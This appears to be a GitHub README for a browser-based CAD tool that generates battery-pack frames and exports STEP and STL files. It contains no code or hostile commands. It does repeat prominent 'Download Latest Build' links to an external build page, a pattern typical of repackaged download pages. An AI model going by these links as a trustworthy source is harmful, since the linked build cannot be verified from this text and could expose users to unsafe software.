# Auto Battery Frame Generator v2026 - CAD generator 2026

> **A browser-based design tool for spot-welded battery packs, built for offline single-file use and STEP/STL export in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-jamesjys9025/auto-battery-frame-generator-2026?style=flat-square)](https://github.com/will-jamesjys9025/auto-battery-frame-generator-2026)

---

<p align="center">
  <a href="https://will-jamesjys9025.github.io/auto-battery-frame-generator-2026/">
    <img src="https://img.shields.io/badge/Download-Auto%20Battery%20Frame%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download Auto Battery Frame Generator">
  </a>
</p>

> **[Download Auto Battery Frame Generator v2026](https://will-jamesjys9025.github.io/auto-battery-frame-generator-2026/)**

---

[Download Latest Build](https://will-jamesjys9025.github.io/auto-battery-frame-generator-2026/)

---

## Overview

Auto Battery Frame Generator is a web-based CAD utility for building battery frames around cell arrangements and exporting the result as STEP or STL. It is intended for spot-welded pack projects where the frame needs to match a specific cell pattern rather than a generic enclosure.

The app is packaged as a single-file browser tool and can be run offline, so it works well for local design sessions without relying on an online service. Powered by OpenCascade, it focuses on generating practical CAD geometry that can be inspected, refined, and prepared for fabrication or 3D printing.

---

## What it does

- Produces STEP files for CAD workflows and STL files for 3D printing
- Runs entirely in the browser as an offline-capable single-file web app
- Lets you place and edit cells in a grid-based layout
- Supports both square and triangular arrangement modes
- Offers straight-side and hug-every-cell outline styles
- Can mirror layouts horizontally for asymmetric packs
- Uses real CAD geometry with true arcs
- Includes a 3D preview with dimensions before export

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/will-jamesjys9025/auto-battery-frame-generator-2026.git
2. Open the application in a modern browser by loading the main HTML file from your local machine.
3. If you prefer the hosted build, use the download link above and open the app from the extracted folder or the page entry point.

Since this is a single-file web app, there is no separate installer or background service to configure.

---

## Usage

1. Set up the battery cell arrangement in the grid editor.
2. Select the layout type that fits your pack, such as square or triangular.
3. Fine-tune the outline mode, spacing, and mirrored orientation as needed.
4. Check the 3D preview and dimensions to make sure the geometry is correct.
5. Export the design as STEP for CAD use or STL for 3D printing.

Typical workflow:
- Place cells
- Edit the frame outline
- Verify the preview
- Export the final geometry

---

## Configuration

Most options live in the browser interface rather than in external config files. Layout, outline behavior, and export settings are changed directly in the app and applied to the active design.

For local use, keep the HTML file and any related assets in the same directory so the application can load properly.

---

## Requirements

- A modern web browser
- Local file access for offline use
- Sufficient disk space for exported STEP and STL files
- A workflow that can open and inspect CAD or 3D printable geometry

The tool is delivered as an HTML-based web app and uses OpenCascade for geometry generation.

---

## FAQ

**Can I use it without an internet connection?**  
Yes. It is meant to operate as an offline browser-based tool.

**Which export formats are available?**  
It can export STEP and STL files.

**Is it possible to adjust the cell layout after starting?**  
Yes. The grid can be placed and edited during the design process.

**Is the app limited to a single pack geometry?**  
No. It supports square and triangular arrangements, along with multiple outline styles.

**What should I check if the preview looks incorrect?**  
Review the grid placement, outline mode, and mirroring setting before exporting.

**How do I get updates?**  
Use the latest build link at the top of the page to access the current version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
